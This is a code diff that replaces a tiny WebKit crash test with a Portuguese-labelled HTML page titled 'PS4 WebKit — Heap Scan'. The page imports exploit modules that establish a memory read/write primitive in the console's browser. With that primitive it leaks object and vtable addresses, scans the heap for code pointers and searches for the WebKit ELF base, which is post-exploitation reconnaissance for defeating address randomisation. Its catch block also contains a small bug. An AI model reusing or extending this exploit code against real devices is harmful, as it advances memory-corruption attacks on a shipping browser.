@@ -1,10 +1,240 @@
-PASS if no crash.
-<div id=x></div>
-<script>
-let audio0 = document.createElement('audio');
-x.append(audio0);
-audio0.controls = true;
-x.append(document.createElement('input'));
-x.outerHTML += '';
-x.remove();
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>PS4 WebKit — Heap Scan</title>
+<style>
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  html, body {
+    height: 100%;
+    background: #0b0f19;
+    color: #c8ced8;
+    font: 14px/1.5 "Segoe UI", system-ui, sans-serif;
+    display: flex; flex-direction: column;
+    align-items: center;
+    justify-content: flex-start;
+    gap: 14px;
+    padding: 20px;
+  }
+  h1 { color: #fff; font-size: 22px; letter-spacing: 0.5px; }
+  #status {
+    font-size: 20px; font-weight: 700; color: #fff;
+    min-height: 1.5em;
+    text-align: center;
+  }
+  #log {
+    width: 95%; max-width: 900px; height: 520px;
+    background: #111827; border: 1px solid #1f2937;
+    border-radius: 10px; padding: 14px 16px;
+    overflow-y: auto; font-family: ui-monospace, SFMono-Regular, monospace;
+    font-size: 12px; color: #9fb1c3;
+    white-space: pre-wrap; word-break: break-all;
+    box-shadow: inset 0 2px 8px rgba(0,0,0,0.4);
+  }
+  #log .ok { color: #4ade80; }
+  #log .err { color: #f87171; }
+  #log .info { color: #60a5fa; }
+  #log .warn { color: #fbbf24; }
+  #actions {
+    display: flex; gap: 12px; flex-wrap: wrap;
+    justify-content: center;
+  }
+  button {
+    padding: 12px 28px; border: 1px solid rgba(255,255,255,0.18);
+    border-radius: 12px; color: #fff;
+    background: linear-gradient(135deg, #3b82f6, #1d4ed8);
+    box-shadow: 0 8px 24px rgba(37,99,235,0.28);
+    font: 700 15px/1 "Segoe UI", system-ui, sans-serif;
+    cursor: pointer; transition: all .12s ease;
+  }
+  button:hover { transform: translateY(-2px); }
+  button:active { transform: translateY(1px); }
+  button:disabled {
+    opacity: 0.45; cursor: not-allowed; transform: none;
+    background: #374151; box-shadow: none;
+  }
+</style>
+</head>
+<body>
+
+<h1>PS4 WebKit — Heap Scan (Safe)</h1>
+<div id="status">Inicializando...</div>
+<div id="log"></div>
+<div id="actions">
+  <button id="btnHeapScan" disabled>Heap Scan</button>
+  <button id="btnInfo" disabled>Info Básica</button>
+  <button id="btnClear" onclick="clearLog()">Limpar Log</button>
+</div>
+
+<script type="module">
+  import { establishPrimitive } from "./resources/core.js";
+  import { installWindowP } from "./resources/mem.js";
+  import { int64 } from "./resources/int64.js";
+
+  const status = document.getElementById("status");
+  const logBox = document.getElementById("log");
+  const btnHeapScan = document.getElementById("btnHeapScan");
+  const btnInfo = document.getElementById("btnInfo");
+
+  function log(msg, cls = "info") {
+    const line = document.createElement("div");
+    line.className = cls;
+    line.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
+    logBox.appendChild(line);
+    logBox.scrollTop = logBox.scrollHeight;
+  }
+
+  window.clearLog = function() {
+    logBox.innerHTML = "";
+  };
+
+  function onCoreEvent(tag, detail) {
+    log(`${tag}: ${detail}`, "info");
+  }
+
+  function onMemEvent(tag, detail) {
+    log(`${tag}: ${detail}`, "info");
+  }
+
+  // ========== INFO BÁSICA (sem scan) ==========
+  window.showInfo = function() {
+    const p = window.p;
+    if (!p) { log("window.p não disponível", "err"); return; }
+
+    log("=== INFO BÁSICA ===", "ok");
+    log(`User-Agent: ${navigator.userAgent}`, "info");
+
+    let ctor = globalThis.__ps5NativeCtor;
+    if (ctor) {
+      log(`__ps5NativeCtor = 0x${ctor.toString(16)}`, "ok");
+    }
+
+    let textarea = document.createElement("textarea");
+    let textAddr = p.leakval(textarea);
+    let vtablePtr = p.read8(textAddr.add32(0x18));
+    log(`textarea @ 0x${textAddr.toString(16)}`, "info");
+    log(`vtable ptr @ 0x${vtablePtr.toString(16)}`, "info");
+
+    // Vtable [0] e [1] apenas (seguro)
+    let e0 = p.read8(vtablePtr);
+    let e1 = p.read8(vtablePtr.add32(8));
+    log(`vtable[0] = 0x${e0.toString(16)}`, "info");
+    log(`vtable[1] = 0x${e1.toString(16)}`, "info");
+
+    // Heap range guess
+    log(`Heap range (guess): 0x200000000 - 0x210000000`, "info");
+  };
+
+  // ========== HEAP SCAN (100% seguro - só lê heap mapeado) ==========
+  window.heapScan = function() {
+    const p = window.p;
+    if (!p) { log("window.p não disponível", "err"); return; }
+
+    log("=== HEAP SCAN (amostral) ===", "ok");
+    log("Procurando ponteiros para 0x80xxxxxxx no heap...", "info");
+
+    // Heap no PS4 começa em ~0x200000000
+    // Vamos fazer scan amostral: a cada 0x1000 bytes, ler 8 bytes
+    const HEAP_START = new int64(0, 0x20); // 0x200000000
+    const HEAP_END = new int64(0, 0x21);   // 0x210000000 (16MB de heap)
+    const STEP = 0x1000; // 4KB
+    const SAMPLES = 4096; // 4096 * 4KB = 16MB
+
+    let found = [];
+    let lowest = null;
+
+    for (let i = 0; i < SAMPLES; i++) {
+      let addr = HEAP_START.add32(i * STEP);
+      try {
+        let val = p.read8(addr);
+        // Procurar ponteiros na faixa 0x800000000 - 0x900000000
+        if (val.hi === 0x8 || (val.hi >= 0x80 && val.hi <= 0x8f)) {
+          // Pode ser um ponteiro de código
+          if (!lowest || (val.hi < lowest.hi) || (val.hi === lowest.hi && val.low < lowest.low)) {
+            lowest = val;
+          }
+          if (found.length < 20) { // só logar os primeiros 20
+            log(`  Heap+0x${(i * STEP).toString(16)} -> 0x${val.toString(16)}`, "info");
+            found.push(val);
+          }
+        }
+      } catch (e) {
+        // Heap pode ter buracos, mas geralmente não
+        if (i % 512 === 0) log(`  unreadable at +0x${(i * STEP).toString(16)}`, "warn");
+      }
+
+      if (i % 1024 === 0 && i > 0) {
+        log(`  Progresso: ${i/1024}MB scanned...`, "info");
+      }
+    }
+
+    if (lowest) {
+      log(`Menor ponteiro encontrado: 0x${lowest.toString(16)}`, "ok");
+      log(`Isso pode estar próximo da base do WebKit`, "warn");
+
+      // Tentar verificar se é ELF alinhando para baixo
+      let aligned = new int64(lowest.low & 0xFFFFC000, lowest.hi);
+      log(`Tentando ler ELF magic @ 0x${aligned.toString(16)}...`, "info");
+      try {
+        let magic = p.read4(aligned);
+        if (magic === 0x464c457f) {
+          log(`ELF MAGIC ENCONTRADO @ 0x${aligned.toString(16)}!!!`, "ok");
+        } else {
+          log(`Magic: 0x${magic.toString(16).padStart(8,'0')} (não é ELF)`, "warn");
+        }
+      } catch (e) {
+        log(`Não conseguiu ler @ 0x${aligned.toString(16)}`, "err");
+      }
+    } else {
+      log("Nenhum ponteiro para 0x80xxxxxxx encontrado no heap", "warn");
+    }
+
+    log("=== HEAP SCAN DONE ===", "ok");
+  };
+
+  btnHeapScan.onclick = window.heapScan;
+  btnInfo.onclick = window.showInfo;
+
+  // ========== BOOTSTRAP ==========
+  log("Carregando módulos...", "ok");
+  status.textContent = "Executando exploit...";
+
+  establishPrimitive({ onEvent: onCoreEvent })
+    .then(carrier => {
+      log("Core: primitivo estabelecido", "ok");
+      log(`Tentativas: ${carrier.attempts}`, "info");
+
+      const prim = installWindowP(carrier, {
+        onEvent: onMemEvent,
+        promote: true
+      });
+
+      log("Mem: real pair ativo", "ok");
+      log("window.p está disponível", "ok");
+
+      window.__carrier = carrier;
+      window.__prim = prim;
+      window.int64 = int64;
+
+      status.textContent = "RW Primitivo OK";
+      status.style.color = "#4ade80";
+      btnHeapScan.disabled = false;
+      btnInfo.disabled = false;
+
+      try {
+        const testAddr = prim.leakval(prim);
+        log(`Sanity leak(prim) = 0x${testAddr.toString(16)}`, "ok");
+      } catch (e) {
+        log(`Sanity leak falhou: ${e.message}`, "err");
+      }
+    })
+    .catch(err => {
+      log(`FALHA: ${err.name}: ${e.message}`, "err");
+      status.textContent = "Falha no exploit";
+      status.style.color = "#f87171";
+    });
 </script>
+
+</body>
+</html>
